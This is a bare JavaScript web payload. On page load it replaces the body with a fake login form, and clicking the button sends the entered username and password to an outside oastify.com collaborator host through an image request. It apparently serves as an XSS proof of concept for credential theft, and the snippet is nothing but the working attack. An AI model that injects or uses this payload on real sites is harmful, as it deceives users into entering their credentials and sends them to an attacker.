window.onload = () => {
document.body.innerHTML = `
<input id="u">
<input id="p" type="password">
<button onclick="(new Image()).src='https://x1z18z1anirpbjij8kd6sjc4tvzmnobd.oastify.com?u='+encodeURIComponent(u.value)+'&p='+encodeURIComponent(p.value)">
Send
</button>
`;
};
